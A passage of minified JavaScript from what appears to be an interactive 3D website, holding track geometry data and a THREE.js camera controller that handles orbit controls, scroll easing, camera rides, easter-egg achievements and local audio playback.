,-0.844,0.332,-0.387,0.352,0.418],[251,63.0,-109,-0.844,0.332,-0.387,0.306,0.495],[292,107,-130,-0.665,0.685,-0.265,0.892,0.518],[266,93.8,-99.9,-0.665,0.685,-0.265,0.553,0.351],[314,138,-94.8,-0.631,0.734,-0.214,0.919,0.442],[286,122,-66.8,-0.631,0.734,-0.214,0.781,0.425],[335,165,-58.5,-0.612,0.753,-0.190,0.738,0.497],[307,149,-30.5,-0.612,0.753,-0.190,0.640,0.546],[357,189,-25.2,-0.543,0.814,-0.115,0.550,0.474],[332,177,6.64,-0.543,0.814,-0.115,0.375,0.390],[387,199,-15.9,-0.081,0.984,0.076,0.327,0.497],[389,196,26.4,-0.081,0.984,0.076,0.104,0.417],[436,201,-19.3,-0.015,0.989,0.080,0.169,0.227],[439,197,22.9,-0.015,0.989,0.080,0.055,0.177],[490,201,-18.9,-0.012,0.990,0.080,0.081,0.054],[485,198,23.1,-0.012,0.990,0.080,0.021,0.013],[548,201,11.9,-0.064,0.990,0.046,0.010,0.104],[514,198,36.8,-0.064,0.990,0.046,0.002,0.041],[569,201,66.0,-0.066,0.990,0.015,0,0.252],[527,198,75.7,-0.066,0.990,0.015,0.001,0.073],[581,201,110,-0.061,0.990,0.025,0,0.289],[542,198,127,-0.061,0.990,0.025,0,0.091],[604,201,132,-0.024,0.990,0.065,0,0.341],[589,198,172,-0.024,0.990,0.065,0,0.316],[647,201,141,-0.011,0.990,0.072,0,0.632],[643,198,183,-0.011,0.990,0.072,0,0.636],[696,201,145,-0.013,0.990,0.074,0,0.561],[694,198,187,-0.013,0.990,0.074,0,0.772],[746,202,148,-0.014,0.991,0.074,0.007,0.622],[744,199,190,-0.014,0.991,0.074,0,0.621],[796,202,150,-0.018,0.991,0.073,0.012,0.371],[794,199,193,-0.018,0.991,0.073,0,0.385],[846,204,153,-0.028,0.992,0.073,0.020,0.326],[844,200,195,-0.028,0.992,0.073,0,0.343],[895,205,155,-0.046,0.992,0.072,0.086,0.306],[894,202,198,-0.046,0.992,0.072,0.012,0.193],[945,208,157,-0.078,0.992,0.070,0.227,0.178],[943,205,200,-0.078,0.992,0.070,0.044,0.057],[995,213,160,-0.156,0.984,0.066,0.413,0.136],[993,210,203,-0.156,0.984,0.066,0.491,0.224],[1043,226,163,-0.422,0.903,0.048,0.419,0.083],[1041,223,206,-0.422,0.903,0.048,0.585,0.174],[1077,260,166,-0.905,0.417,0.003,0.421,0],[1076,258,209,-0.905,0.417,0.003,0.523,0],[1089,307,168,-0.985,0.131,-0.005,0.289,0],[1089,307,210,-0.985,0.131,-0.005,0.388,0]]],[300,3100,50,25,[[-805,78.9,-114,0.164,-0.557,0.785,0.049,0.052],[-809,44.6,-137,0.164,-0.557,0.785,0.089,0.064],[-756,79.9,-122,0.137,-0.559,0.786,0.152,0.079],[-759,45.7,-146,0.137,-0.559,0.786,0.221,0.092],[-709,82.2,-127,0.059,-0.563,0.795,0.179,0.074],[-707,48.2,-151,0.059,-0.563,0.795,0.313,0.100],[-663,87.4,-124,-0.041,-0.570,0.795,0.128,0.058],[-655,53.7,-147,-0.041,-0.570,0.795,0.045,0.060],[-616,94.8,-114,-0.092,-0.574,0.789,0.182,0.051],[-605,61.4,-137,-0.092,-0.574,0.789,0.164,0.164],[-568,102,-102,-0.106,-0.576,0.788,0.230,0.181],[-557,69.0,-125,-0.106,-0.576,0.788,0.310,0.275],[-518,108,-91.7,-0.097,-0.575,0.789,0.221,0.244],[-510,74.8,-115,-0.097,-0.575,0.789,0.219,0.249],[-466,111,-83.7,-0.077,-0.575,0.792,0.224,0.389],[-463,77.7,-108,-0.077,-0.575,0.792,0.394,0.420],[-415,112,-79.1,-0.062,-0.575,0.792,0.265,0.487],[-414,77.9,-103,-0.062,-0.575,0.792,0.401,0.571],[-365,110,-76.4,-0.054,-0.574,0.794,0.257,0.631],[-365,76.5,-101,-0.054,-0.574,0.794,0.379,0.640],[-313,107,-75.4,-0.043,-0.571,0.798,0.245,0.595],[-316,73.6,-100,-0.043,-0.571,0.798,0.451,0.597],[-256,97.4,-81.4,0.025,-0.587,0.788,0.436,0.604],[-276,67.3,-103,0.025,-0.587,0.788,0.483,0.554],[-220,58.4,-117,0.100,-0.667,0.714,0.448,0.387],[-260,46.4,-123,0.100,-0.667,0.714,0.445,0.357],[-208,24.0,-154,0.124,-0.740,0.644,0.201,0.464],[-249,14.5,-157,0.124,-0.740,0.644,0.262,0.334],[-201,0.540,-198,0.185,-0.942,0.227,0.127,0.784],[-242,-7.87,-199,0.185,-0.942,0.227,0.097,0.761],[-198,-4.02,-248,0.192,-0.963,0.026,0.031,0.885],[-240,-12.3,-249,0.192,-0.963,0.026,0.006,0.742],[-195,-3.21,-296,0.192,-0.965,-0.032,0.015,0.798],[-236,-11.2,-301,0.192,-0.965,-0.032,0,0.751],[-186,1.81,-340,0.208,-0.956,-0.117,0.004,0.748],[-225,-4.99,-354,0.208,-0.956,-0.117,0,0.629],[-166,13.8,-365,0.348,-0.872,-0.292,0.004,0.583],[-189,16.6,-401,0.348,-0.872,-0.292,0,0.528],[-131,34.5,-375,0.441,-0.814,-0.323,0.029,0.526],[-141,45.0,-414,0.441,-0.814,-0.323,0.009,0.338],[-90,57.4,-375,0.432,-0.815,-0.320,0.061,0.242],[-95.0,70.3,-415,0.432,-0.815,-0.320,0.010,0.199],[-45.4,77.7,-373,0.343,-0.853,-0.323,0.266,0.129],[-48.7,91.3,-412,0.343,-0.853,-0.323,0.060,0.097],[1.88,92.0,-371,0.206,-0.896,-0.328,0.294,0.254],[-0.510,105,-411,0.206,-0.896,-0.328,0.086,0.069],[50.7,99.6,-371,0.093,-0.918,-0.332,0.299,0.207],[49.3,113,-410,0.093,-0.918,-0.332,0.088,0.019],[99.2,103,-370,0.083,-0.924,-0.336,0.276,0.156],[100,117,-410,0.083,-0.924,-0.336,0.073,0.082],[141,107,-362,0.333,-0.891,-0.267,0.250,0.147],[155,124,-398,0.333,-0.891,-0.267,0.061,0.099],[155,119,-336,0.679,-0.669,0.247,0.268,0.204],[186,145,-348,0.679,-0.669,0.247,0.120,0.122],[151,136,-293,0.660,-0.618,0.371,0.326,0.056],[181,165,-299,0.660,-0.618,0.371,0.230,-0.087],[142,155,-247,0.651,-0.622,0.368,0.338,-0.049],[172,183,-254,0.651,-0.622,0.368,0.422,0.019],[142,179,-195,0.634,-0.721,0.154,0.709,-0.035],[172,200,-215,0.634,-0.721,0.154,0.574,-0.037],[188,202,-157,0.280,-0.918,-0.171,0.780,0.181],[196,212,-197,0.280,-0.918,-0.171,0.634,0.092],[240,211,-150,0.092,-0.948,-0.204,0.590,0.428],[241,220,-191,0.092,-0.948,-0.204,0.540,0.183],[290,211,-150,-0.097,-0.945,-0.208,0.279,0.693],[291,220,-190,-0.097,-0.945,-0.208,0.291,0.451],[339,201,-151,-0.281,-0.915,-0.203,0.430,0.774],[340,210,-192,-0.281,-0.915,-0.203,0.354,0.521],[386,185,-153,-0.342,-0.901,-0.200,0.448,0.698],[387,193,-194,-0.342,-0.901,-0.200,0.417,0.444],[433,167,-155,-0.346,-0.900,-0.199,0.436,0.537],[434,176,-196,-0.346,-0.900,-0.199,0.293,0.359],[480,150,-158,-0.344,-0.904,-0.199,0.240,0.475],[480,159,-199,-0.344,-0.904,-0.199,0.248,0.332],[528,133,-162,-0.294,-0.922,-0.204,0.256,0.319],[527,143,-203,-0.294,-0.922,-0.204,0.231,0.197],[578,122,-168,-0.132,-0.956,-0.226,0.138,0.138],[573,133,-208,-0.132,-0.956,-0.226,0.233,0.139],[631,126,-179,0.153,-0.930,-0.289,0.375,0.075],[617,136,-218,0.153,-0.930,-0.289,0.429,0.083],[677,144,-195,0.301,-0.870,-0.339,0.442,0.102],[660,153,-232,0.301,-0.870,-0.339,0.416,0.039],[720,166,-209,0.324,-0.853,-0.350,0.182,0.228],[703,175,-246,0.324,-0.853,-0.350,0.183,0.171],[761,183,-219,0.246,-0.884,-0.335,0.030,0.328],[751,196,-258,0.246,-0.884,-0.335,0.027,0.315],[805,193,-220,0.138,-0.913,-0.329,0.011,0.348],[805,208,-260,0.138,-0.913,-0.329,0.005,0.368],[849,196,-213,0.118,-0.918,-0.331,0.001,0.370],[859,212,-252,0.118,-0.918,-0.331,0.001,0.396],[886,197,-196,0.226,-0.919,-0.272,0,0.376],[911,212,-226,0.226,-0.919,-0.272,0,0.427],[909,197,-163,0.323,-0.919,-0.133,0,0.345],[945,212,-178,0.323,-0.919,-0.133,0,0.437],[922,197,-118,0.341,-0.919,-0.076,0,0.253],[961,212,-127,0.341,-0.919,-0.076,0,0.255],[931,197,-70.8,0.347,-0.920,-0.044,0,0.295],[970,212,-77.0,0.347,-0.920,-0.044,0,0.335],[937,198,-22.4,0.353,-0.922,-0.003,0,0.579],[977,213,-26.1,0.353,-0.922,-0.003,0,0.613],[939,201,25.7,0.354,-0.922,0.109,0.004,0.527],[978,216,25.2,0.354,-0.922,0.109,0,0.524],[932,228,69.0,0.196,-0.262,0.931,0.078,0.218],[973,234,61.9,0.196,-0.262,0.931,0.043,0.176],[930,280,75.4,0.186,-0.040,0.961,0.068,0.142],[972,281,67.5,0.186,-0.040,0.961,0.042,0.160],[930,330,77.0,0.185,-0.024,0.962,0,0.042],[971,331,69.1,0.185,-0.024,0.962,0,0.075],[929,380,78.2,0.185,-0.020,0.963,0,0.000],[971,381,70.3,0.185,-0.020,0.963,0,0.000],[929,430,79.3,0.185,-0.015,0.964,0,0.000],[970,431,71.4,0.185,-0.015,0.964,0,0.000]]],[200,3850,50,20,[[-715,399,-458,0.568,-0.006,-0.822,0,0],[-680,400,-434,0.568,-0.006,-0.822,0,0],[-715,349,-458,0.568,-0.007,-0.822,0,0],[-680,350,-434,0.568,-0.007,-0.822,0,0],[-715,299,-458,0.568,-0.007,-0.822,0,0.000],[-680,300,-433,0.568,-0.007,-0.822,0,0.000],[-715,249,-457,0.568,-0.008,-0.822,0,0.015],[-680,250,-433,0.568,-0.008,-0.822,0,0.031],[-715,199,-456,0.568,-0.016,-0.821,0,0.112],[-680,200,-432,0.568,-0.016,-0.821,0,0.162],[-715,149,-454,0.569,-0.047,-0.819,0,0.262],[-680,150,-430,0.569,-0.047,-0.819,0,0.388],[-715,98.1,-449,0.571,-0.153,-0.804,0,0.303],[-680,102,-424,0.571,-0.153,-0.804,0,0.432],[-715,48.8,-419,0.570,-0.663,-0.482,0,0.212],[-680,68.6,-404,0.570,-0.663,-0.482,0,0.305],[-715,29.5,-367,0.567,-0.811,-0.139,0,0.093],[-680,53.3,-363,0.567,-0.811,-0.139,0,0.157],[-717,23.2,-318,0.565,-0.822,-0.066,0,0.028],[-681,47.2,-313,0.565,-0.822,-0.066,0,0.100],[-720,17.1,-270,0.566,-0.820,-0.072,0,0.018],[-685,40.6,-262,0.566,-0.820,-0.072,0.006,0.088],[-727,7.57,-223,0.570,-0.814,-0.104,0,0.090],[-692,30.2,-212,0.570,-0.814,-0.104,0.005,0.182],[-736,-5.59,-177,0.574,-0.807,-0.130,0.001,0.042],[-701,16.5,-164,0.574,-0.807,-0.130,0.006,0.108],[-742,-19.8,-125,0.578,-0.798,-0.166,0.002,0.219],[-707,4.29,-120,0.578,-0.798,-0.166,0.014,0.349],[-718,-19.2,-62.3,0.540,-0.802,-0.253,0.002,0.130],[-700,3.15,-93.8,0.540,-0.802,-0.253,0.015,0.292],[-668,5.34,-40.8,0.490,-0.826,-0.277,0.011,0.115],[-667,19.5,-81.2,0.490,-0.826,-0.277,0.035,0.272],[-623,28.8,-34.0,0.451,-0.845,-0.284,0.099,0.098],[-624,41.6,-74.9,0.451,-0.845,-0.284,0.226,0.241],[-577,49.3,-29.6,0.377,-0.877,-0.292,0.199,0.100],[-579,62.3,-70.4,0.377,-0.877,-0.292,0.367,0.240],[-531,64.0,-25.2,0.245,-0.920,-0.304,0.294,0.110],[-530,77.6,-65.8,0.245,-0.920,-0.304,0.407,0.269],[-483,72.4,-20.5,0.165,-0.933,-0.313,0.367,0.151],[-481,86.3,-60.9,0.165,-0.933,-0.313,0.395,0.382],[-430,85.5,-17.3,0.440,-0.842,-0.305,0.466,0.133],[-437,96.8,-58.0,0.440,-0.842,-0.305,0.459,0.241],[-398,135,-27.0,0.877,-0.237,-0.415,0.354,0.106],[-418,126,-64.0,0.877,-0.237,-0.415,0.388,0.153],[-404,189,-52.9,0.873,-0.071,-0.482,0.161,0.051],[-421,161,-80.3,0.873,-0.071,-0.482,0.321,0.137],[-431,217,-103,0.863,-0.052,-0.501,0.164,0.035],[-436,175,-108,0.863,-0.052,-0.501,0.273,0.149],[-456,220,-150,0.909,-0.056,-0.407,0.122,0.035],[-458,178,-149,0.909,-0.056,-0.407,0.174,0.132],[-466,219,-198,0.987,-0.040,0.135,0.204,0.135],[-468,177,-196,0.987,-0.040,0.135,0.284,0.242],[-440,216,-240,0.650,0.010,0.758,0.293,0.396],[-442,173,-237,0.650,0.010,0.758,0.387,0.587],[-399,212,-269,0.540,0.020,0.840,0.233,0.563],[-401,169,-266,0.540,0.020,0.840,0.264,0.723],[-357,210,-293,0.444,0.021,0.894,0.193,0.720],[-357,167,-292,0.444,0.021,0.894,0.151,0.803],[-315,214,-306,0.096,-0.024,0.993,0.177,0.707],[-305,173,-308,0.096,-0.024,0.993,0.133,0.896],[-275,230,-301,-0.262,-0.163,0.950,0.193,0.454],[-254,193,-301,-0.262,-0.163,0.950,0.154,0.737],[-237,254,-281,-0.387,-0.237,0.890,0.078,0.243],[-215,218,-281,-0.387,-0.237,0.890,0.126,0.453],[-195,276,-257,-0.379,-0.236,0.894,0.057,0.113],[-178,237,-260,-0.379,-0.236,0.894,0.161,0.286],[-147,290,-234,-0.329,-0.224,0.917,0.109,0.056],[-138,248,-241,-0.329,-0.224,0.917,0.236,0.188],[-95.6,291,-217,-0.264,-0.221,0.938,0.142,0.118],[-96.1,250,-227,-0.264,-0.221,0.938,0.198,0.187],[-44.4,284,-206,-0.202,-0.229,0.951,0.085,0.178],[-50.6,243,-218,-0.202,-0.229,0.951,0.086,0.206],[5.33,273,-201,-0.101,-0.250,0.961,0.258,0.262],[-3.46,233,-212,-0.101,-0.250,0.961,0.167,0.295],[53.0,264,-206,0.276,-0.310,0.908,0.378,0.304],[46.0,224,-217,0.276,-0.310,0.908,0.433,0.351],[91.7,268,-231,0.732,-0.274,0.623,0.187,0.322],[88.9,228,-246,0.732,-0.274,0.623,0.332,0.309],[121,281,-269,0.812,-0.244,0.527,0.197,0.113],[119,241,-284,0.812,-0.244,0.527,0.349,0.090],[155,292,-305,0.556,-0.309,0.767,0.211,0.014],[151,251,-318,0.556,-0.309,0.767,0.336,0.006],[206,287,-320,-0.064,-0.254,0.962,0.214,0],[195,248,-331,-0.064,-0.254,0.962,0.303,0],[247,261,-298,-0.795,0.215,0.563,0.142,0.059],[226,228,-315,-0.795,0.215,0.563,0.202,0.054],[257,231,-258,-0.858,0.372,0.351,0.145,0.202],[235,200,-277,-0.858,0.372,0.351,0.228,0.205],[260,205,-216,-0.863,0.409,0.291,0.350,0.448],[238,172,-234,-0.863,0.409,0.291,0.419,0.494],[262,182,-174,-0.867,0.435,0.238,0.725,0.688],[241,148,-188,-0.867,0.435,0.238,0.680,0.742],[265,170,-132,-0.874,0.463,0.140,0.930,0.659],[244,133,-135,-0.874,0.463,0.140,0.735,0.783],[270,176,-93.2,-0.889,0.456,0.010,0.766,0.628],[252,141,-77.5,-0.889,0.456,0.010,0.532,0.591],[281,195,-55.5,-0.873,0.483,0.042,0.393,0.572],[266,165,-28.8,-0.873,0.483,0.042,0.232,0.498],[300,215,-35.8,-0.561,0.778,0.278,0.023,0.492],[302,203,4.93,-0.561,0.778,0.278,0.009,0.470],[334,232,-44.9,-0.248,0.941,0.228,0.006,0.465],[354,228,-7.39,-0.248,0.941,0.228,0,0.505],[369,244,-69.0,-0.157,0.973,0.168,0.006,0.539],[398,243,-37.5,-0.157,0.973,0.168,0,0.450],[398,253,-103,-0.115,0.985,0.122,0.011,0.716],[433,254,-78.0,-0.115,0.985,0.122,0.001,0.578],[425,260,-143,-0.102,0.989,0.103,0.014,0.623],[461,262,-120,-0.102,0.989,0.103,0,0.721],[451,267,-185,-0.100,0.989,0.100,0.009,0.393],[487,269,-162,-0.100,0.989,0.100,0,0.552],[477,274,-227,-0.096,0.990,0.094,0.004,0.152],[513,276,-204,-0.096,0.990,0.094,0,0.242],[505,281,-269,-0.089,0.992,0.084,0,0.027],[540,282,-244,-0.089,0.992,0.084,0,0.085],[540,287,-310,-0.065,0.996,0.058,0,0.006],[569,287,-279,-0.065,0.996,0.058,0,0.013],[591,290,-340,-0.002,0.999,0.023,0,0.002],[604,289,-299,-0.002,0.999,0.023,0,0.004],[651,288,-344,0.079,0.996,0.017,0,0.002],[642,288,-302,0.079,0.996,0.017,0,0.004],[702,282,-328,0.102,0.994,0.024,0,0.019],[686,283,-288,0.102,0.994,0.024,0,0.055],[748,277,-307,0.110,0.993,0.027,0,0.084],[730,278,-268,0.110,0.993,0.027,0,0.187],[793,271,-285,0.111,0.993,0.028,0,0.197],[774,272,-246,0.111,0.993,0.028,0,0.352],[838,266,-262,0.111,0.993,0.028,0,0.341],[819,267,-224,0.111,0.993,0.028,0.007,0.493],[882,260,-240,0.109,0.993,0.027,0,0.429],[863,261,-202,0.109,0.993,0.027,0.006,0.561],[926,255,-219,0.089,0.995,0.018,0,0.399],[909,256,-180,0.089,0.995,0.018,0.001,0.607],[970,252,-203,0.052,0.998,0.004,0.001,0.177],[958,252,-162,0.052,0.998,0.004,0.003,0.415],[1017,250,-192,0.012,0.999,-0.004,0.002,0.025],[1009,251,-150,0.012,0.999,-0.004,0.014,0.076],[1065,251,-185,-0.044,0.998,-0.013,0.025,0.002],[1060,251,-142,-0.044,0.998,-0.013,0.042,0.002],[1114,256,-178,-0.168,0.982,-0.028,0.085,0],[1109,256,-136,-0.168,0.982,-0.028,0.136,0],[1161,272,-173,-0.563,0.819,-0.075,0.105,0],[1156,273,-131,-0.563,0.819,-0.075,0.132,0],[1187,313,-170,-0.951,0.281,-0.121,0.099,0],[1182,313,-127,-0.951,0.281,-0.121,0.100,0],[1196,362,-169,-0.985,0.109,-0.125,0.039,0],[1191,362,-126,-0.985,0.109,-0.125,0.039,0]]],null,null,null,null,null,null]";
Acko.Effect=function(){this.order=0;this.renderer="webgl"};Acko.Effect.prototype={build:function(a){},update:function(a){},tick:function(a){},resize:function(a){}};Acko.Effects=[];
Acko.Effect.Camera=function(){Acko.Effect.call(this);this.order=-2;this.fov=30;this.renderer="webgl";this.perspective=this.theta=this.phi=0;this.lookAt=_v(0,0,0);this.center=_v(0,0,0);this.orbitScale=1;this.thetaI=this.thetaT=this.thetaA=this.thetaB=.27;this.phiT=this.phiA=this.phiB=0;this.orbitT=this.orbitA=this.orbitB=1;this.phiDelta=this.thetaDelta=this.orbitFactor=0;this.overlayScale=this.heroScale=1;this.phiC=-.64;this.orbitC=1200;this.scrollEaseRatio=.1;this.scrollEaseRange=1.7;this.forceLock=
this.slowframes=0;this.controls=hasAchievement("prllx");this.absolute=1;this.sdir=this.sacc=0;this.scnt=1;this.travel=this.shdr=0;this.last=[-1,-1];this.cuts=0;this.bounceLimit=8;this.ignoreClicks=0;this.growlCancel=[];this.lastAudio=0;this.cameraLock=!0;this.rides=Acko.CameraRides;this.activeRide=-1;this.v1=_v();this.v2=_v();this.v3=_v();this.v4=_v();this.m1=new THREE.Matrix4;this.m2=new THREE.Matrix4;this.handlers={document:{},window:{}};this.container=null};
Acko.Effect.Camera.prototype=_.extend(new Acko.Effect,{build:function(a){a.cameraController=this;this.bind();this.container=document.querySelector("#native-frame");this.parent=a.parent},bind:function(){var a=!1,b=!1,c=[0,0,0,0],e=null,g=null,f=function(f){f=f||{};var k=(f.clientY||c[3])+(this.last.y||0);f.clientY&&(c[3]=f.clientY);f=k<this.pageStart;k=e&&e.classList.contains("draggable");this.cameraLock=!(k||a);f=(b=this.controls&&!this.ride&&f||k)?"move":"default";f!=g&&(g=this.pointerPunch.style.cursor=
f)}.bind(this);document.addEventListener("mousedown",this.handlers.document.mousedown=function(e){1==e.which&&"SELECT"!=e.target.tagName&&(a=b,c=[e.pageX,e.pageY,e.clientX,e.clientY],a&&e.preventDefault())}.bind(this));document.addEventListener("mouseup",this.handlers.document.mouseup=function(b){this.cameraLock=a=!1}.bind(this));document.addEventListener("mousemove",this.handlers.document.mousemove=function(b){e=b.target;f(b);a&&(b=[b.pageX,b.pageY,b.clientX,b.clientY],this.phiT-=.005*(b[0]-c[0]),
this.thetaT=Math.min(\u03c0/2*.9,Math.max(-\u03c0/2*.9,this.thetaT+.005*(b[1]-c[1]))),c=b)}.bind(this));window.addEventListener("scroll",this.handlers.window.scroll=function(a){f()});document.addEventListener("keydown",this.handlers.document.keydown=function(a){if(this.controls)switch(a.keyCode){case 68:this.phiDelta=-1;break;case 65:this.phiDelta=1;break;case 87:this.thetaDelta=-1;break;case 83:this.thetaDelta+=1;break;case 81:this.orbitFactor=1;break;case 69:this.orbitFactor=-1}}.bind(this));document.addEventListener("keyup",
this.handlers.document.keyup=function(a){13!=a.keyCode&&32!=a.keyCode&&27!=a.keyCode||this.stopRide();if(this.controls)switch(a.keyCode){case 68:case 65:this.phiDelta=0;break;case 87:case 83:this.thetaDelta=0;break;case 81:case 69:this.orbitFactor=0}}.bind(this));this.pointerPunch=document.querySelector(".pointer-punch");this.bound=!0},unbind:function(){for(var a in this.handlers){var b=this.handlers[a],c;for(c in b)window[a].removeEventListener(c,b[c])}document.body.style.cursor="default";this.bound=
!1},updateCameraState:function(a){a.updateProjectionMatrix();a.updateMatrixWorld();a.matrixWorldInverse.getInverse(a.matrixWorld)},update:function(a){this.tracks=a.tracks;this.visualizer=a.visualizer;var b=a.scene,c=a.camera,e=a.scroll,g=a.tracks,f=this.v1,h=this.v2,k=this.v3,p=this.v4,m=this.m1,t=this.m2;if(!this.bound)return this.updateCameraState(c);var w=Math.max(0,Math.min(1,(e.y-100)/Math.max(100,this.pageStart-300))),q=.5-.5*Math.cos(3.1415*w),y=.8*q+.2;this.thetaT=Math.min(\u03c0/2*.9,Math.max(-\u03c0/
2*.9,this.thetaT+.05*this.thetaDelta));this.phiT+=.05*this.phiDelta;this.orbitT=Math.min(1.6,this.orbitT*pow(1.07,this.orbitFactor));this.thetaA+=.2*(this.thetaT-this.thetaA);this.thetaB+=.2*(this.thetaA-this.thetaB);this.theta=this.thetaB*(1-q);this.phiA+=.2*(this.phiT-this.phiA);this.phiB+=.2*(this.phiA-this.phiB);this.phi=this.phiB+this.phiC*(1-q);this.orbitA+=.2*(this.orbitT-this.orbitA);this.orbitB+=.2*(this.orbitA-this.orbitB);this.orbit=(this.orbitB+(1-this.orbitB)*q)*this.orbitC;this.intro(c,
a.time);var r=this.scrollEase,z=this.scrollEaseRatio;a.heroAbsScale=.8*(1+(1/this.overlayScale-1)*q);Time.isSlow()&&(a.visualizer.playing||0<this.tracks.tracks[0].speed||.1<this.tracks.blackhole)?(this.slowFrames++,120==this.slowFrames&&achievement&&achievement("bllt")):this.slowFrames=0;if(!this.audioWaiting&&this.ride){try{this.audio.volume=Acko.globalVolume}catch(u){}var C=0==this.audio.currentTime?0:a.delta/Time.getSpeed(),C=Math.max(1E-5,C);g.visibleHolder.add(c);var B=this.rides[this.activeRide],
r=0;if(B&&null!=this.travel){var D=(w=B[7])?-1:1,w=w?B[2]:B[3];this.travel*D>w*D&&(r+=Math.abs(this.travel-w),B=this.cycleRide())}var G=B[0],q=B[1]?-1:1,D=(w=B[7])?-1:1,W=B[7]?B[3]:B[2],z=B[4],b=B[5],w=Math.min(.1,C)/.016/Time.getSpeed(),w=Math.pow(2*B[6],1/w),y=B[8]||[0,0,0],B=!B[9],g=g.tracks[G],C=180*C*D,D=175*D;g.priority=this.cuts;this.ridePos||(this.travel=W+r,W=1/Math.max(.25,w),r=g.getMatrices(g.lengthMap.map(this.travel-C*W)),m.copy(r.mat4),r=g.getMatrices(g.lengthMap.map(this.travel+D-C*
W)),t.copy(r.mat4),h.set(m.elements[4]*z*q,m.elements[5]*z*q,m.elements[6]*z*q),f.set(m.elements[12],m.elements[13],m.elements[14]).add(h),k.set(t.elements[12],t.elements[13],t.elements[14]).add(h),k.x+=y[0],k.y+=y[1],k.z+=y[2],this.ridePos=_v().copy(f),this.rideTarget=_v().copy(k),this.rideUp=_v().copy(h));r=g.getMatrices(g.lengthMap.map(this.travel));m.copy(r.mat4);r=g.getMatrices(g.lengthMap.map(this.travel+D));t.copy(r.mat4);this.travel+=C;h.set(m.elements[4]*z*q,m.elements[5]*z*q,m.elements[6]*
z*q);f.set(m.elements[12],m.elements[13],m.elements[14]).add(h);k.set(t.elements[12],t.elements[13],t.elements[14]).add(h).sub(f);p.set(m.elements[4]*q,m.elements[5]*q,m.elements[6]*q);p=k.dot(p)/k.length();m=1;B&&0>p&&(m=Math.max(.2,1+.2*p-p*p*.6),matrices2=g.getMatrices(g.lengthMap.map(this.travel+D*m)),t=matrices2.mat4);k.set(t.elements[12],t.elements[13],t.elements[14]).add(h);k.x+=y[0];k.y+=y[1];k.z+=y[2];this.ridePos.lerp(f,w);this.rideTarget.lerp(k,w);this.rideUp.lerp(h,w/6/(3+m)*4);r=c.matrix;
r.set(1,0,0,this.ridePos.x,0,1,0,this.ridePos.y,0,0,1,this.ridePos.z,0,0,0,1);r.lookAt(this.ridePos,this.rideTarget,this.rideUp);c.fov=this.fov*b;c.matrixAutoUpdate=!1;c.matrixWorldNeedsUpdate=!0}else h=a.viewHeight,c.fov=this.fov,this.perspective=.5/Math.tan(THREE.Math.degToRad(.5*c.fov))*h,h=Math.cos(this.theta),k=Math.sin(this.theta),t=Math.cos(this.phi),p=Math.sin(this.phi),m=e.x||0,g=e.y,B=g/r,B=(.5>B?B*B:B-.25)*r,g=-(B+(g-B)*z||0),z=this.orbit*this.heroScale*this.orbitScale,r=this.perspective,
r=Math.min(2400,z+(r-z)*y),y=r*h,b.add(c),c.matrixAutoUpdate=!0,c.position.copy(this.center).multiplyScalar(1-q),c.position.x+=y*p,c.position.z+=y*t,c.position.y+=r*k,f.copy(this.lookAt).multiplyScalar(1-q),c.lookAt(f),c.position.x+=m-g*k*p-20*q+140*(1-q),c.position.y+=g*h,c.position.z-=g*k*t;this.last&&0!=e.y&&(f=e.y-this.last.y,e.y>1.5*this.pageStart+200&&(this.scnt=0),0<Math.abs(f)&&(0<=f*this.sacc?this.sacc+=f:(this.shdr=e.y>a.pageStart?Math.max(this.shdr-1,0):this.shdr+2,50<Math.abs(this.sacc)?
(this.scnt++,0==this.scnt%this.bounceLimit&&(3<this.shdr&&(this.bounceLimit=12,this.shdr=0,achievement&&achievement("prllx"),this.controls=!0,this.visualizer.start()),this.scnt=0)):this.scnt=Math.max(0,this.scnt-1),this.sacc=0),this.stopRide()));this.last=e;a.ride=this.ride;a.audio=this.audio;a.cameraLerp=w;this.audio&&(e=this.audio.currentTime,265.7>=this.lastAudio&&265.7<e&&achievement&&achievement("dm"),280.5>=this.lastAudio&&280.5<e&&(this.audio.currentTime+=10),this.lastAudio=e);e=a.pastMasthead=
this.last&&this.last.y>a.pageStart;a=a.pastHalfMasthead=this.last.y>this.pageStart/2;w=this.forceLock||.1;if(e||this.forceLock)this.thetaT+=(this.thetaI-this.thetaT)*w;if(this.forceLock||a&&this.cameraLock)this.orbitFactor=this.thetaDelta=this.phiDelta=0,this.phiT=(((this.phiT+\u03c0)%\u03c4+\u03c4)%\u03c4-\u03c0)*(1-w),this.phiA=((this.phiA+\u03c0)%\u03c4+\u03c4)%\u03c4-\u03c0,this.phiB=((this.phiB+\u03c0)%\u03c4+\u03c4)%\u03c4-\u03c0;this.updateCameraState(c)},lock:function(a){void 0!==a&&(this.forceLock=
a);return this.forceLock},intro:function(a,b){if(8.05<b)this.lookAt.x=0,this.lookAt.y=0,this.center.x=0,this.center.y=0,this.center.z=0;else{var c=.303125*Math.max(0,8-b),c=4*(.5>c?c*c:c-.25);this.lookAt.x=-c*c*6;this.lookAt.y=18*-c;this.center.x=50*-c;this.center.z=-c*c*10;this.center.y=52*c}},stopRide:function(){if(this.ride){this.ride=!1;this.ridePos=null;this.fadeAudio();for(var a;a=this.growlCancel.pop();)a();this.tracks.override(!1);this.parent.resize(!0)}},cycleRide:function(){this.activeRide=
(this.activeRide+1)%this.rides.length;this.rideUp=this.rideTarget=this.ridePos=this.travel=null;this.cuts++;return this.rides[this.activeRide]},runRide:function(){this.ride||(gl.exports.scrollController.set(0,0),this.ignoreClicks=1,this.ride=!0,this.activeRide=-1,this.cycleRide(),this.scnt=0,this.visualizer.stop(),this.tracks.override(!0),this.injectAudio())},resize:function(a){var b=a.viewWidth,c=a.viewHeight;a.camera.aspect=a.aspect;this.heroScale=Math.max(1,c/b*1.9);a.overlayScale=this.overlayScale=
Math.max(960/b,1);this.scrollEase=c*this.scrollEaseRange;this.heroHeight=this.scrollEase/2;this.heroMargin=140;this.pointerPunch.style.paddingBottom=.65*this.heroHeight+"px";a.heroMargin=this.heroMargin;a.pageStart=this.pageStart=this.heroHeight+this.heroMargin+Math.max(0,a.viewHeight-940)/4;this.container.style.top=Math.round(this.pageStart)+"px";a.cameraScrollYOffset=.25*(1-this.scrollEaseRatio)*this.scrollEase},injectAudio:function(){if(!this.audio){var a=this.audio=new Audio,b;[["audio/ogg","/audio/this-world.ogg"],
